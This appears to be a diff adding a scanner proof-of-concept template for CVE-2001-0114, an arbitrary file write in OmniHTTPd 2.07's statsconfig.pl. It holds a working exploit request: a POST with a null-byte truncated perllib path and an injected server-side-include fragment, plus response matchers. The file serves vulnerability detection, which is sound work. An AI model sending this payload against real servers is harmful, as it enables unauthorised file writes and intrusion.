@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "OmniHTTPd 2.07 中 /cgi-bin/statsconfig.pl 对 perllib 和 cgidir 参数缺乏过滤，发送包含构造参数的 POST 请求可检测目标是否存在该漏洞脚本。验证基于检查响应中脚本已执行的标志。"
+id = "POC-AVE-2001-0048"
+name = "OmniHTTPd 2.07 statsconfig.pl 任意文件写入 PoC"
+severity = "medium"
+tags = ["cve-2001-0114"]
+vuln_id = [
+    "CVE-2001-0114",
+    "AVE-2001-0048",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/statsconfig.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "perllib=c:/httpd/cgi-bin/statsconfig.pl%00&cgidir=c:/httpd/cgi-bin&deflimit=&mostip=on&mostreq=on&mostbrowsers=on&timelog=on&mostipnum=5&mostreqf=5&mostbrowsernum=5&logloc=c:/httpd/logs/access.log&imagebar=/statsbar.gif&serveradd=%3C%21--%23echo+var%3D&barwidth=100&barheight=5&listpass=&bgcolor=%23FFFFFF&bgimage=&ttBGcolor=%23FFFFDD"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "statsconfig",
+    "OmniHTTPd",
+    "Content-type",
+]
